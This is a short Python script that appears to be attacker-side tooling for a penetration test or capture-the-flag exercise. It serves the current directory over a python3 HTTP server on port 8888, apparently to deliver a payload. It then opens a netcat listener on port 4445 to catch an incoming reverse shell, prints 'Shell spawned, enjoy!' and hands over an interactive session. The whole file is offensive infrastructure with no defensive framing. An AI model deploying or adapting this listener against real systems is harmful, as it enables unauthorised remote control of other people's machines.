import subprocess
import asyncio
import pexpect
import time
import sys
import os

childGroup = os.getpgid(0) +1
children = []
def registerChild(pid):
    global children
    global childGroup
    os.setpgid(pid, childGroup)
    children.append(pid)

import signal
def cleanupChildren():
    print("[+] Cleaning up spawned processes")
    global children
    global childGroup

    os.killpg(childGroup, signal.SIGKILL)
    #for child in children:
    #    print("[+] Killing pid %s" % pid)
    #    os.kill(child)
    #    os.wait(child)

def startHTTPServer(port, directory):
    pid = os.fork()
    if not pid:
        os.chdir(directory)
        os.system("`which python3` -m http.server %s >httpServerLog.txt 2>&1" % port)
        os._exit(0)
    registerChild(pid)    
    print("Child process group: %s"% os.getpgid(pid))
    print("Parent process group: %s"% os.getpgid(0))
    return pid

def startShellListener(port):
    revShellCmd = "/usr/bin/nc -vnlp %s" % shellPort
    p = pexpect.spawn(revShellCmd)
    p.expect('Listening on.*$')
    return p

def catchShell(p):
    p.expect("(Connection received.*$)", 5000)
    print("[+] %s" % p.match.group(1).decode('ascii').rstrip())

    print("[+] Shell spawned, enjoy!")
    p.interact()    


shellPort = 4445

try:
    startHTTPServer(8888, "./")

    p = startShellListener(shellPort)
    catchShell(p)
finally:
    cleanupChildren()

